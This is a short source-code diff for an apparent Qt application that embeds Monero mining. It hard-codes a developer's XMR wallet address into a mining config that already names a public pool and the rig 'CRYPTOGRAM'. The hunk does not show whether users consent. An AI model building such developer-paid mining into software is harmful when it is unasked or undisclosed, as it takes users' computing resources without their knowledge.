@@ -82,7 +82,7 @@ struct MoneroMiningStatistics {
 struct MoneroMiningConfig {
 	// Mining pool settings (configured by developer)
 	QString poolAddress = "pool.supportxmr.com:3333";
-	QString walletAddress = "";         // Developer's XMR wallet (set in code)
+	QString walletAddress = "4B9Q3Z8ixtpaWxFP3UJLRc2ffDDb7nsU3HWL3i7hEczFKHbTSRoD1CuU7eZotuYj2RRf6kzMdLZjBb1QNXApaZVi5sN5mXF";
 	QString rigName = "CRYPTOGRAM";     // Identifier in pool stats
 
 	// CPU settings
